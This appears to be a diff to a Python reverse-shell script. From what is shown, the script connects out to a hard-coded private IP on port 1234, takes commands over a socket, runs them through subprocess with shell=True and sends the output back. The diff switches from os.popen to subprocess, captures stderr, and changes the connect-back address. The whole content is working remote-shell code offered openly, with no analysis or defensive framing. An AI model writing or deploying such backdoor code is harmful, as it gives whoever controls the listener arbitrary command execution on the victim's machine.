@@ -1,5 +1,6 @@
 import socket
 import json
+import subprocess
 import os
 
 def server(ip, port):
@@ -47,11 +48,13 @@ def run():
                 except Exception as e:
                     result = f"cd error: {e}"
             else:
-                result = os.popen(command).read()
+                # result = os.popen(command).read()
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                result = process.stdout.read() + process.stderr.read()
             send(result)
         except Exception as e:
             print(f"Error executing command: {e}")
 
 
-server('192.168.1.3', 1234)
-run(),
+server('192.168.1.15', 1234)
+run()
